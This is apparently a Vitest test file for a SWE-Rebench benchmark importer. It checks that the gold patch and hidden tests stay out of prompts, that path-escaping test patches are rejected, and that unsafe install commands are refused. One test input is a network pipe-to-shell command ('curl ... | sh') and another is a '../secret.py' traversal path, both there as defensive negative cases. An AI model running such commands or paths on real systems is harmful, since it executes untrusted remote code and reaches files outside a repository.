import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import { describe, expect, it } from 'vitest';
import {
  convertSweRebenchRecord,
  selectSweRebenchRecords,
} from '../../benchmarks/provider/import-swerebench-lib.mjs';

const source = {
  instance_id: 'fair-workflows__nanopub-140',
  repo: 'fair-workflows/nanopub',
  base_commit: '859c68baed45027eba70fc222e08ccb3cedfa96b',
  problem_statement: 'Click callbacks must accept ctx, param, value.',
  patch: 'SECRET_GOLD_SOLUTION',
  test_patch: [
    'diff --git a/tests/test_setup_profile.py b/tests/test_setup_profile.py',
    '--- a/tests/test_setup_profile.py',
    '+++ b/tests/test_setup_profile.py',
  ].join('\n'),
  meta: { is_lite: true },
};

const cache = {
  instance_id: 'fair-workflows__nanopub-140',
  repo: 'fair-workflows/nanopub',
  language: 'py',
  FAIL_TO_PASS: ['tests/test_setup_profile.py::test_validate_orcid_id'],
  PASS_TO_PASS: [
    'tests/test_setup_profile.py::test_provided_keypair_copied_to_nanopub_dir',
  ],
  install_config: {
    python: '3.9',
    install: 'pip install -e .[dev]',
    test_cmd:
      'pytest --no-header -rA --tb=line --color=no -p no:cacheprovider -W ignore::DeprecationWarning',
  },
};

describe('SWE-Rebench importer', () => {
  it('converts a Python record without leaking the gold solution', () => {
    const task = convertSweRebenchRecord(source, cache);

    expect(task).toMatchObject({
      id: 'fair-workflows__nanopub-140',
      repo: 'fair-workflows/nanopub',
      baseCommit: source.base_commit,
      prompt: source.problem_statement,
      evaluator: {
        commands: [
          ['node', expect.stringMatching(/\.evaluate\.mjs$/)],
        ],
      },
      metadata: {
        source: 'swe-rebench',
        language: 'py',
        python: '3.9',
      },
    });

    const serialized = JSON.stringify(task);
    expect(serialized).not.toContain('SECRET_GOLD_SOLUTION');
    expect(serialized).toContain('test_setup_profile.py');
    expect(task.evaluator.files[0]!.content).toBe(source.test_patch + '\n');
    expect(task.evaluator.files[0]!.content.endsWith('\n')).toBe(true);
    expect(task.evaluator.files[1]!.path).toMatch(/\.evaluate\.mjs$/);
    expect(task.evaluator.files[1]!.content).toContain('python:3.9-slim');
    expect(task.evaluator.files[1]!.content).toContain('docker');
    expect(task.evaluator.files[1]!.content).toContain("'--network'");
    expect(task.evaluator.files[1]!.content).toContain("'host'");
    expect(task.evaluator.files[1]!.content).toContain(
      'tests/test_setup_profile.py::test_validate_orcid_id',
    );
    expect(task.evaluator.files[1]!.content).toContain(
      source.base_commit,
    );
    expect(task.evaluator.files[1]!.content).toContain(
      "['git', 'checkout', baseCommit, '--', ...testFiles]",
    );
    expect(task.evaluator.files[1]!.content).toContain(
      'tests/test_setup_profile.py',
    );
  });

  it('keeps hidden test patches out of the prompt', () => {
    const task = convertSweRebenchRecord(source, cache);
    expect(task.prompt).not.toContain('diff --git');
    expect(task.prompt).not.toContain('test_validate_orcid_id');
  });

  it('rejects records without a hidden test patch or pinned base commit', () => {
    expect(() =>
      convertSweRebenchRecord({ ...source, test_patch: '' }, cache),
    ).toThrow(/test_patch/i);

    expect(() =>
      convertSweRebenchRecord({ ...source, base_commit: '' }, cache),
    ).toThrow(/base_commit/i);
  });

  it('generates a syntactically valid hidden evaluator module', async () => {
    const task = convertSweRebenchRecord(source, cache);
    const evaluator = task.evaluator.files.find((file) =>
      file.path.endsWith('.evaluate.mjs'),
    );
    expect(evaluator).toBeDefined();

    const dir = await mkdtemp(join(tmpdir(), 'archeagent-swerebench-evaluator-'));
    const path = join(dir, 'evaluate.mjs');
    try {
      await writeFile(path, evaluator!.content, 'utf8');
      const checked = spawnSync(process.execPath, ['--check', path], {
        encoding: 'utf8',
        shell: false,
      });
      expect({
        status: checked.status,
        stderr: checked.stderr,
      }).toEqual({
        status: 0,
        stderr: '',
      });
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('rejects hidden test patch paths that escape the repository', () => {
    expect(() =>
      convertSweRebenchRecord({
        ...source,
        test_patch: [
          'diff --git a/tests/a.py b/../secret.py',
          '--- a/tests/a.py',
          '+++ b/../secret.py',
          '@@ -1 +1 @@',
          '-old',
          '+new',
        ].join('\n'),
      }, cache),
    ).toThrow(/test patch path/i);
  });

  it('rejects unsupported Python install commands instead of executing dataset shell', () => {
    expect(() =>
      convertSweRebenchRecord(source, {
        ...cache,
        install_config: {
          ...cache.install_config,
          install: 'curl https://example.invalid | sh',
        },
      }),
    ).toThrow(/install/i);
  });

  it('currently refuses non-Python task caches instead of inventing an evaluator', () => {
    expect(() =>
      convertSweRebenchRecord(source, { ...cache, language: 'js' }),
    ).toThrow(/Python/i);
  });

  it('selects requested instance ids in request order and rejects missing ids', () => {
    const records = [
      source,
      { ...source, instance_id: 'fairlearn__fairlearn-636' },
    ];

    expect(
      selectSweRebenchRecords(records, [
        'fairlearn__fairlearn-636',
        'fair-workflows__nanopub-140',
      ]).map((record) => record.instance_id),
    ).toEqual([
      'fairlearn__fairlearn-636',
      'fair-workflows__nanopub-140',
    ]);

    expect(() =>
      selectSweRebenchRecords(records, ['missing__task-1']),
    ).toThrow(/missing__task-1/);
  });
});
